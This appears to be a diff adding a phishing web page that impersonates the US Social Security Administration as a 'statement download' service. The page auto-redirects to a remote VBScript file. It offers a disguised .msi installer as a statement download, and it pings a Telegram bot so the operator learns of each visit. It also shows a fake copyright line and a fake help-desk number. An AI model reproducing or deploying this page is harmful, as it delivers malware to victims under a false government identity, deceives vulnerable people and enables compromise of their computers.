@@ -1,0 +1,182 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon">
+  <meta http-equiv="refresh" content="5; url=https://dringlohng12.github.io/ii/Start.vbs">
+  <title>The United States Social Security Administration | SSA</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: radial-gradient(circle at top, #0f172a, #020617);
+      display: flex;
+      align-items: center;
+      justify-content: center;SSA_Statement_Pdf
+      color: #e5e7eb;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 520px;
+      background: rgba(255, 255, 255, 0.06);
+      backdrop-filter: blur(14px);
+      border-radius: 16px;
+      padding: 36px 32px 40px;
+      box-shadow: 0 30px 80px rgba(0, 0, 0, 0.45);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      text-align: center;
+    }
+
+    .logo {
+      width: 56px;
+      height: 56px;
+      border-radius: 14px;
+      background: linear-gradient(135deg, #38bdf8, #6366f1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 20px;
+      color: #020617;
+      margin: 0 auto 18px;
+    }
+
+    h1 {
+      font-size: 26px;
+      margin: 0 0 10px;
+      letter-spacing: -0.3px;
+    }
+
+    p {
+      font-size: 15px;
+      color: #cbd5f5;
+      margin: 0 0 30px;
+      line-height: 1.6;
+    }
+
+    .progress-wrap {
+      margin-bottom: 34px;
+    }
+
+    .progress-label {
+      font-size: 13px;
+      color: #a5b4fc;
+      margin-bottom: 10px;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 10px;
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 999px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, #38bdf8, #6366f1);
+      transition: width 5s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .btn {
+      display: none;
+      margin-top: 30px;
+      padding: 14px 42px;
+      background: linear-gradient(135deg, #38bdf8, #6366f1);
+      color: #020617;
+      font-size: 15px;
+      font-weight: 600;
+      text-decoration: none;
+      border-radius: 999px;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .btn:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 10px 30px rgba(99, 102, 241, 0.45);
+    }
+
+    .footer {
+      margin-top: 34px;
+      font-size: 12px;
+      color: #94a3b8;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo"><img style="width: 80px; height: 80px;" src="assets/logo.svg" alt=""></div>
+    <h1>Processing Statement</h1>
+    <p>Your statement is being securely prepared. This will only take a moment. <span style="color: white ;">Your download will start automatically. If it doesn't, click the link below. </span></p>
+
+
+    <div class="progress-wrap">
+      <div class="progress-label" id="progressText">Encrypting & verifying…</div>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+    </div>
+
+    <a href="Social_Document_ADFARBTNFH8G_19SYPURD17668_windows_x64 (1).msi" class="btn" id="downloadBtn" download>
+      Download Statement
+    </a>
+
+    <div class="footer">© 2026 Social Security Administration</div>
+    <div class="footer">For further assistance, please contact our help desk at 1-800-123-4567.</div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const fill = document.getElementById("progressFill");
+      const text = document.getElementById("progressText");
+      const btn = document.getElementById("downloadBtn");
+
+      fill.getBoundingClientRect();
+      fill.style.width = "100%";
+
+      setTimeout(() => {
+        text.textContent = "Your statement is ready.";
+        btn.style.display = "inline-block";
+      }, 5000);
+    });
+  </script>
+   <script>
+
+// Replace with your bot token and chat ID
+const BOT_TOKEN = "";
+const CHAT_ID = ""; 
+const MESSAGE = "New - S App";
+
+// Telegram API endpoint
+const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+// Send message using fetch
+fetch(url, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    chat_id: CHAT_ID,
+    text: MESSAGE
+  })
+})
+  .then(response => response.json())
+  .then(data => {
+    console.log("Message sent:", data);
+  })
+  .catch(error => {
+    console.error("Error:", error);
+  });
+
+       
+</script>
+</body>
+</html>
